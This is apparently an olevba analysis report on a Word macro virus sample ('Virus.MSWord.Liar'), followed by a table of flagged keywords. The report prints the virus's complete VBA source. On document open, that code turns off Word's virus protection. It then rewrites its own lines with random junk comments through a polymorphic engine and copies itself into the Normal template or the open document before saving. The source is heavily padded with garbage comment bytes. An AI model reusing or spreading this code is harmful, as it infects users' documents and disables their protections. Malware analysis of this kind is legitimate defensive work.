olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar-e6fb88f97769f0c5c4dfac0eb11d25df9ccec405283cfcbc2de89ac1acc3911a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar-e6fb88f97769f0c5c4dfac0eb11d25df9ccec405283cfcbc2de89ac1acc3911a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open() 'ÊÆãá²þ³®¹ûÖ©°ÚŸ¨ú¡ÛË³úÄÑâÁ¿åä­­Å�¤éº�çÊõœ¼þÆõõ°ãûâÙá¡ž×äïï¿Ö
Dim v(150): Options.VirusProtection = False 'åÎÈÞÇ¬ñüßã¬ó©ÏþÓÐó¡Ü¢×ß²áµèÌ¥¸æ¦Âæ¨ÉÛòõÎ¥¾ÙÒ«Ç·Ï§à÷µÝÍüÅ 
'¤®ÀÆµ¸�Êþ¿æ¥ºÍéÄöí°êÔ®ìÒ¹æÛ¶·§¶÷ÓÃïáÆôöáØÔø®¯¿Øè¼£ö´Ó¯ñ­¤º§»ÞÁ
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '´âê¶ÈÞœžÝ²ÌóŸ¨Å÷©öÛ¾¼ÙÅžþ»žîÅ¸ŸçÎ¡¼ð¬¥÷áÌ»ÏôÝ¹í¢ß¸Íïã÷£º¼äÊÏÁ¼¯ÍßÈÐ
'´âê¶ÈÞœžÝ²ÌóŸ¨Å÷©öÛ¾¼ÙÅžþ»žîÅ¸ŸçÎ¡¼ð¬¥÷áÌ»ÏôÝ¹í¢ß¸Íïã÷£º¼äÊÏÁ¼¯ÍßÈÐ
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) 'Ü²õÆë¨ù÷»ÁÈ¹¬ÔÅÔÕÈ³ÊÏÏ¦Âû¼¢¥îÍø¥éÑòïÛÃæÜÞãµ¾Ñûìå ¥ äÝ·º¹Ü�à¦¬¼ó
'Ü²õÆë¨ù÷»ÁÈ¹¬ÔÅÔÕÈ³ÊÏÏ¦Âû¼¢¥îÍø¥éÑòïÛÃæÜÞãµ¾Ñûìå ¥ äÝ·º¹Ü�à¦¬¼ó
'Çí¡ìÅžáíÆå«¾æä¡ìÛúË¦ïñúñóÕ¡È¦âúÞÐûÅ·¹Îõ²£¥¤ÕŸöÁ¼Þª ïºÉ­£Ìû¸Ùù«îÀÂÐ·ž¨ö§À¸Ó
Set nh = s.VBProject.VBComponents(1).CodeModule 'ø Ñ£çóêîçîïèÈ «ÞöøËÏÙåýÿþù­âÜ¼Ü¬ÍóÂÎÐÀžŸºáèÂ¾¡þÒ¦æåØìëñ®ý»
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y 'åÛüÉñ§ç¦Òì¨ÇžéìÅé±¨´Û½Ç¤ÔøµÑ¯è²ó«áéŸ¤ÌÎ¾ÆÇÅÿ�éì»½åùãÖÄÇÇÊ¿Ð å�öÜÎåÄô·
vc = "Sub document_close()" & t & vx & vbCr 'ßçÊµßÁÇÙÓÚðåø¡ßÕ§§¹�ÝáèìÌÁü±ûÑÊÍÕ¨¨ýÊ¯Ê¢Ø²æõñ¨óáØ¦ý¡¾«æèò¿ØÒ²ûÏÅ
If MacroContainer = NormalTemplate Then 'Úø»ÕÕ�úåßåÊöãÜÀŸ×ÿ¥±ÞÜ¶ óåÞÚÕ¥ûÁ­È¯×Í¸žæðØäÌ÷µòÌÂ®ñýµ¸«Ÿÿ
Set s = ActiveDocument: Set nh = s.VBProject.VBComponents(1).CodeModule 'Û¾ÀÂÇœô£Àùæ¼ñÊñØú¯ÂÕ¡ÔûØÐ³Ïþ÷­£ø£Ó¢´÷½ÕùüÙ±»Ýèî£Ä·óû¾¿Ýºûº¯
'Û¾ÀÂÇœô£Àùæ¼ñÊñØú¯ÂÕ¡ÔûØÐ³Ïþ÷­£ø£Ó¢´÷½ÕùüÙ±»Ýèî£Ä·óû¾¿Ýºûº¯
'Üöß¡ø žÅÂóäÍ¶ÓÉæüñ¥øòÔÍùüÛù¿°«ÂåÚýÊÝ­«®ÎÀ¨Ç¡×Ø²ã·ºÜÚá¹ÜÇÙ³Êï
'Üöß¡ø žÅÂóäÍ¶ÓÉæüñ¥øòÔÍùüÛù¿°«ÂåÚýÊÝ­«®ÎÀ¨Ç¡×Ø²ã·ºÜÚá¹ÜÇÙ³Êï
vc = "Sub document_open()" & t & vx & vbCr 'õò¼Ú¶ý�²¯ìÍÝ�ä»°¤«÷Íá×Ë÷ôÇÑëðË½¼²¶ü°¡§¬¦ÐõœîÈØ¬°ÎÝ§ê°÷ù·ßÏùÞ
'œ°ðÐè ê«¿ÜÛÀ¥ýáëðÈûî£Ï«áé°Ì·ž®£ÚÁç³´úÍÇ®¸ß�îœÉãÁ£èõ´žžÍ�åÓê¼ á
'œ°ðÐè ê«¿ÜÛÀ¥ýáëðÈûî£Ï«áé°Ì·ž®£ÚÁç³´úÍÇ®¸ß�îœÉãÁ£èõ´žžÍ�åÓê¼ á
End If: Randomize: lin = abc.countoflines '¬íò�äöü¼á¡§ñùÖÎÉÖ�íÎ¯Þ°þÏ¬ ³¯ÒÂÒ£±®Æ¼Ù¿Ü¸ÙÄ¡§åœ§¥Ÿ¬±éé¶àðôåÙâ
'Åðíà£ûûÔ´ê°Àœç³¯ÉºÞÆû�áÚ°ÈÓ¼¡ëÛÎœ®ÈíÓð¹Ô±÷ÞÈ¼¤Ç Õûè¡¼¦êµÝŸ�¸ªßÓ¡Åíü
'Åðíà£ûûÔ´ê°Àœç³¯ÉºÞÆû�áÚ°ÈÓ¼¡ëÛÎœ®ÈíÓð¹Ô±÷ÞÈ¼¤Ç Õûè¡¼¦êµÝŸ�¸ªßÓ¡Åíü
For i = 2 To lin '°û¼ÞÂð©Ö¼ßÐÓæ«Ð÷¸Àª§¼¨¢ËÔ¯±æÉ°ôÃ¶¹íÞøÖõÃß¹ØÍÄá»¼éë³áŸâ¬Ýàôú£îœçù
'°û¼ÞÂð©Ö¼ßÐÓæ«Ð÷¸Àª§¼¨¢ËÔ¯±æÉ°ôÃ¶¹íÞøÖõÃß¹ØÍÄá»¼éë³áŸâ¬Ýàôú£îœçù
jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) '�¼³ä®½ÀÜ´ÍÝ³óªéÅÏÊôÙž¶µþ³ÏÛ²©ß»Àòæ¡§ÌœÚ¢ÅÛ±×áüÏÔúÑ×â©õÍíŸªØâÍ²èê¿ÿ¥Ø
'�¼³ä®½ÀÜ´ÍÝ³óªéÅÏÊôÙž¶µþ³ÏÛ²©ß»Àòæ¡§ÌœÚ¢ÅÛ±×áüÏÔúÑ×â©õÍíŸªØâÍ²èê¿ÿ¥Ø
If p = 0 Then GoTo e_ 'Ýö¥žëÜ²Â±ÖÍœôëú«Úæ½¡Ê·»¬èµÉ¯¢�þ÷àÎ´æ§°úœ¤ï¨úËæúÚò¦£¿ùë 
'Ýö¥žëÜ²Â±ÖÍœôëú«Úæ½¡Ê·»¬èµÉ¯¢�þ÷àÎ´æ§°úœ¤ï¨úËæúÚò¦£¿ùë 
If p = 1 And lin > 100 Then '§¨Åá±§¾ù°ïöõ©»Ã¿ÜîË£ÄÖöÆ³µ©ã¥­ØÀã½èâŸ©óØ¿ïÕñ·ì­´ÀÒÞÅ×½ÖÐÌíÌÑž«¹ÂÃ¡
'§¨Åá±§¾ù°ïöõ©»Ã¿ÜîË£ÄÖöÆ³µ©ã¥­ØÀã½èâŸ©óØ¿ïÕñ·ì­´ÀÒÞÅ×½ÖÐÌíÌÑž«¹ÂÃ¡
'¼Í¦ú¹°òäÊõ÷û¾µÛ±®ßµÂ¯æÍ¨ÇÊæñÍµ°ä÷àÚªÀøó°Ó ³äöùÉ­œ£Ð³ãœ¶­¬ÕÔþÀöÍ¬Þ«ŸÇ÷üà
'¼Í¦ú¹°òäÊõ÷û¾µÛ±®ßµÂ¯æÍ¨ÇÊæñÍµ°ä÷àÚªÀøó°Ó ³äöùÉ­œ£Ð³ãœ¶­¬ÕÔþÀöÍ¬Þ«ŸÇ÷üà
d = 1: GoTo n_ 'äâèÅÒ²Ÿõÿý¸ÂÔôÇ¡ú¾þ¾ý·òÅÂø ¹¸ÂõëÄù¹°¢ Îãõ°æÓÂÈØú ß¥êÆÝÑœïô­ïò¤
'äâèÅÒ²Ÿõÿý¸ÂÔôÇ¡ú¾þ¾ý·òÅÂø ¹¸ÂõëÄù¹°¢ Îãõ°æÓÂÈØú ß¥êÆÝÑœïô­ïò¤
End If 'ÓÎÐÚÈœ¹¸¶ìñÓÉ¡Äá¿ªÏ�³äô¸þÏ¡ôÝòßåÛžáœÞ¯ªËÔÀíåäêÔ¨½¿ÊÃ¿ÔÝ¤¹ÅõêÜïŸü¨£ÿ
v(i) = Left(abc.Lines(i, 1), (p - 1)) 'äç¦µÌðÈ¬çë¦Èõ®µê¹Ñ¶´«øôê¢»ªÌµß¢ÍÞðŸíç­žçŸìÉ­¿òúÊþ·Ý¸¿¿Ð¢Þ´©®«øÆ ¨ª¦ã
'íÉå½Ÿý¾æìÁåÔ§õ×Å ÆåÒèâÁþ©º¯Á«Ä©Ö«³ù¤à»ÈŸ¯ËÜªËÒÊºìò¿øôÍÎ
For j = 1 To Int(75 - (Rnd * 20))  'µü³ŸÁÆ¦Ä¢æê´à´ûÇçëäÕâÕ¶¨½Ù§¾ ©ÁûñÑÉÖ¤´ëõ÷´ªÓÐ¿ãô¬ºž·ïÎÍÀìÚïýìòªè¢
'µü³ŸÁÆ¦Ä¢æê´à´ûÇçëäÕâÕ¶¨½Ù§¾ ©ÁûñÑÉÖ¤´ëõ÷´ªÓÐ¿ãô¬ºž·ïÎÍÀìÚïýìòªè¢
'Ûœ®óýæÑõÊ¼¿Óôß´çÄÅñ²ò´ËëÛµ¸×¸óÇñ¡ØïÓýÑâæîÑðßé¶âÝíö±ÞýÚ´ã«ñþùó³ûËß¿ì¢¶µ
jc = jc & Chr(255 - Int(Rnd * 100)) 'ÊÜÅ¹õõìÆ¿é­ ž÷ »Â¤ÔÃó¨Ü¼½ãÞÙ¬ò£Ú´¦ÝÜØÑÙêñÍ¾ÕÀ¤û»¬ÄÚ®ÚÎØ©ô¬žÇŸ½É
Next j 'Ã­ù³«´Ê¬Ñ¹Ë¾¦£Æ½¸æÑÊ¿øÙ­¬Ëä°Û¥ÑÓþÒÂ¨äé¬©ÀÛý¹ùÎÂç¯ÐÜçÛáËž®Øäžå¤àê½Â±Û°ºÚ×Èü
'Ã­ù³«´Ê¬Ñ¹Ë¾¦£Æ½¸æÑÊ¿øÙ­¬Ëä°Û¥ÑÓþÒÂ¨äé¬©ÀÛý¹ùÎÂç¯ÐÜçÛáËž®Øäžå¤àê½Â±Û°ºÚ×Èü
v(i) = v(i) & t & jc 'Ò½õµØÔæí»œÉºážÜðØÏ³Ðø¶Ü¥ÕøÓÄµñØÏ÷ÝßàýÈ¡�Àü¶ñ­ºáÿ±ÍøØ°ëôñëæßÃµø®ÊœÓ
'Ò½õµØÔæí»œÉºážÜðØÏ³Ðø¶Ü¥ÕøÓÄµñØÏ÷ÝßàýÈ¡�Àü¶ñ­ºáÿ±ÍøØ°ëôñëæßÃµø®ÊœÓ
'ëéëßçÝÚÎ£ ¦ïÐ¦ÊôÞÔ¬¶ðïáÄøæ²èéªúáÏ©­«È­´¦óñ¤áÏÇÖ¯è¬âÜàº¾ºäùûé±ÍòýØ§ÅëÆÙñÍ
If d = 2 Then v(i) = v(i) & vbCr & t & jc 'òøª×þÂü®ãÀ¸³¾÷¨¢Öí¸äøÒÑ¼æøÛ¢¬ÐŸ�ÝòÂÝÃºæ³ÅèØåÄ£×å½´úöò·ê¿Á÷¢Ûõ
'òøª×þÂü®ãÀ¸³¾÷¨¢Öí¸äøÒÑ¼æøÛ¢¬ÐŸ�ÝòÂÝÃºæ³ÅèØåÄ£×å½´úöò·ê¿Á÷¢Ûõ
vc = vc & v(i) & vbCr 'Óßò°åÑëÕõž­Ûõ´Ý×ÒÇÃ­ªÂþìëÐ¤àÃéôÅÐª¶Öö¨á÷çéú¼ëÖËØ¤¤ÚùÑ±Ð¤³ÅêÈÊ
'Óßò°åÑëÕõž­Ûõ´Ý×ÒÇÃ­ªÂþìëÐ¤àÃéôÅÐª¶Öö¨á÷çéú¼ëÖËØ¤¤ÚùÑ±Ð¤³ÅêÈÊ
'åÑ¸ÄË¸óð´ÅòÅÝÒªÂ¥úÏ¶¯¬¢ç£¶¶Á½÷îøç«ºÛðúÎ¦�ËÐúÖ²Û³Ðäúßù¨ÞÍµÍ¸­ºñÇìüÿÈ¹àþæ¹
n_: 'üñ¥úëòÁžÖ­¦ÐãØ¤ÏâÒ½Á¢ÂíÛõåúÎ¹¸ì«ÅÏªê¼¦¥ÅÞ¨àÈûø öåíÃÔÆÏêàö¸××õõæû¤
Next i 'ðûî­ÏÃóÝý¥¹×¶Ø¾ÈÏ´ž½åÞºØ¾µþ�Ñ¯Äå±Âñ£öÿçû²ðÔ°¯ÐÊÉ¼³éúÀÅ©ûñ¤Â¤Êý¼²ÿ¿Ÿµ
'ðûî­ÏÃóÝý¥¹×¶Ø¾ÈÏ´ž½åÞºØ¾µþ�Ñ¯Äå±Âñ£öÿçû²ðÔ°¯ÐÊÉ¼³éúÀÅ©ûñ¤Â¤Êý¼²ÿ¿Ÿµ
e_: '¦Ö·ùÔ¾¸âÐÄ¥§Ø¢®¿¦×²§ûÅÀÚ¿¨¶Ö±¯ùá¸Í±¤¬Ì©ÂòµöØ¾®éäÕÎÐ¡ÑÌìÂðÅªé³¿è²ÛÝ«œ
'¦Ö·ùÔ¾¸âÐÄ¥§Ø¢®¿¦×²§ûÅÀÚ¿¨¶Ö±¯ùá¸Í±¤¬Ì©ÂòµöØ¾®éäÕÎÐ¡ÑÌìÂðÅªé³¿è²ÛÝ«œ
If nh.countoflines < 2 Then '¼èðýñÆñèæäóÝóÛûçÃÉ©¡áÝù±¶ÍÌŸ®ÅÊÛÉ£êÐ ¹ü·ÞÕÀ�¿Ô£àã¡Ô�Ÿù¬´
'¼èðýñÆñèæäóÝóÛûçÃÉ©¡áÝù±¶ÍÌŸ®ÅÊÛÉ£êÐ ¹ü·ÞÕÀ�¿Ô£àã¡Ô�Ÿù¬´
nh.AddFromString vc: s.Save '¯ØÂ óÖ¨ÑŸõÔøÑ­«ÏÂÒ¡ÔäèÁÅÌ·µ¾éõÜ¬¥½ò×³Äø¿ûŸÍ Âúëå¶±¤¿çÉûç³êÇØØÜâÿÒ¯ãëÄ
'¯ØÂ óÖ¨ÑŸõÔøÑ­«ÏÂÒ¡ÔäèÁÅÌ·µ¾éõÜ¬¥½ò×³Äø¿ûŸÍ Âúëå¶±¤¿çÉûç³êÇØØÜâÿÒ¯ãëÄ
'çò÷úÀÂ¡®Ë¿œÐÝ�±¢·«ÑßÆÌýíÉóª�Á±Ò·ü¨ÏœÙÀüöúœòÊ­¾Ï·±ÖË£Ð·½ÓæÆ¬óŸÏì
End If '£ëéÍ­ªÔÀÓê�ÜÖð°êô×äÚì°Ð¥Ó²ÂÍ«í¶Ü¡ä½æÝ¢çû¿ãµêÕÜÆ¯ÂïäÈù ¼äØ·
'£ëéÍ­ªÔÀÓê�ÜÖð°êô×äÚì°Ð¥Ó²ÂÍ«í¶Ü¡ä½æÝ¢çû¿ãµêÕÜÆ¯ÂïäÈù ¼äØ·
'üŸÙÕÅ¸ê£Û¯¢ùåÜ¹º¬ÄÒßÈ®«âÍ½Ññ÷ºäãëúÝ¬ÍÆ±¯þœ¤Ï Ï°ø°ÖªÈÂÙ§¨½Ñèáí·æö
If Day(Now()) = 31 Then MsgBox Application.UserName & "is bliemed!", 64, "Class.bliem by jacktwo lzo/meta" 'ýÞÜ¨åïÑüÅøÛ»¥ÁÐÜïãÔ£âÅº§×Ëßªéêöá­¶¯¾Åâ¨ÑÜÁð�¡¿þ£¯ã¼Óœº³
End Sub 'Äîöù¡òËð°Í¢ÀÑØ¯Á¤�Õ­×Å¼îÝœœ¨Îý¹ÉâØÎºÈ²íÖáõ´ß íÄ®·ÍûÔíÝó¼çüÄªåÁïÞ×Àø
'î®þüåòÇùØÛà­Úª¹åÔ®·³Ðä­ã¶Úñ¹È¨ ÉÎ¡Û±¿óæùíÀÊþæ¦Ë¢þå·ºŸù¸­ÍªÙž®£ØÏ¦õ©Þ
Rem Another virus by Jack Twoflower [LineZer0 & Metaphase] 'áè¸ §ù¯ë¯Ðæýø°ñÿ×í÷òÒœúææÔÌ¬£Ó¼ÿÁªò«²´½¯ÒðâÃì©»ó­¿À´³È¡§Õ¼Ì¾
'áè¸ §ù¯ë¯Ðæýø°ñÿ×í÷òÒœúææÔÌ¬£Ó¼ÿÁªò«²´½¯ÒðâÃì©»ó­¿À´³È¡§Õ¼Ì¾
'¿žôëÃ¬Ä¨Î¶ÙäáÉÐ»çÓ©Ñàç¸Õò©­ÏùöÞËÒ½»ÆäÒ²ìŸþÏöÔÚÞýÐþÔ¡äò¸×
'¿žôëÃ¬Ä¨Î¶ÙäáÉÐ»çÓ©Ñàç¸Õò©­ÏùöÞËÒ½»ÆäÒ²ìŸþÏöÔÚÞýÐþÔ¡äò¸×
Rem Uses "bliem" polymorhic engine by Jack Twoflower 'Üñá¹Ìû´ôèçàç¹Í¸º¼¥¬Àî¼ýªÓÛ¼ŸîçùŸ¢¢×œ©åéÝ¼Ï©·°ÄÖ±ªœ½«ØÖÈ�°ÿ¼çÎ´õðÒòÌÍ®Ÿ

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

